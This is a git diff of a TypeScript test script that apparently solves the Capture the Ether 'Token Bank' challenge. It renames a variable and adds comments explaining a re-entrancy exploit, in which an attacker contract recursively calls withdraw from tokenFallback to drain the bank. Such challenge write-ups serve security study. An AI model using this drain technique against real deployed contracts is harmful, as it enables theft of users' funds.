@@ -5,7 +5,7 @@ import { expect } from "chai";
 let accounts: Signer[];
 let eoa: Signer;
 let attacker: Contract;
-let contract: Contract; // challenge contract
+let challengeContract: Contract;
 let tx: any;
 
 const ATTACKER_INITIAL_BALANCE = ethers.utils.parseEther(`500000`);
@@ -16,18 +16,22 @@ before(async () => {
   const challengeFactory = await ethers.getContractFactory(
     "TokenBankChallenge"
   );
-  contract = challengeFactory.attach(
+  challengeContract = challengeFactory.attach(
     `0xa649bBE9F268fB18008179e8759EA396BB56f90A`
   );
 });
 
 it("solves the challenge", async function () {
-  // there's a re-entrancy issue when doing the withdraw
+  // The attack should be initiated from a contract(attacker) to be able
+  // to exploit the vulnerability in withdraw function from TokenBankChallenge
+  // Because there is a re-entrancy issue when doing the withdraw
   // withdraw => token.transfer => msg.sender.tokenFallback() => ...
-  // => balance is reset after the token.transfer only
+  // Balance in TokenBankChallenge is only updated after finishing tokenFallback 
+  // in which we can make it to call withdraw function recursively until all 
+  // balance is drained from TokenBank contract within the context of tokenFallback
   const attackerFactory = await ethers.getContractFactory("TokenBankAttacker");
-  attacker = await attackerFactory.deploy(contract.address);
-  const tokenAddress = await contract.token();
+  attacker = await attackerFactory.deploy(challengeContract.address);
+  const tokenAddress = await challengeContract.token();
   const tokenFactory = await ethers.getContractFactory("SimpleERC223Token");
   const token = await tokenFactory.attach(tokenAddress);
 
@@ -35,7 +39,7 @@ it("solves the challenge", async function () {
 
   // need to move tokens from eoa to contract for contract to use funds
   // challenge => EOA
-  tx = await contract.withdraw(ATTACKER_INITIAL_BALANCE);
+  tx = await challengeContract.withdraw(ATTACKER_INITIAL_BALANCE);
   await tx.wait();
 
   // EOA => attacker
@@ -49,7 +53,7 @@ it("solves the challenge", async function () {
   tx = await attacker.deposit();
   await tx.wait();
 
-  const attackerBalance = await contract.balanceOf(attacker.address);
+  const attackerBalance = await challengeContract.balanceOf(attacker.address);
   console.log(`attackerBalance`, attackerBalance.toString());
   expect(attackerBalance).to.eq(ATTACKER_INITIAL_BALANCE);
 
@@ -67,6 +71,6 @@ it("solves the challenge", async function () {
    */
   await tx.wait();
 
-  const isComplete = await contract.isComplete();
+  const isComplete = await challengeContract.isComplete();
   expect(isComplete).to.be.true;
 });
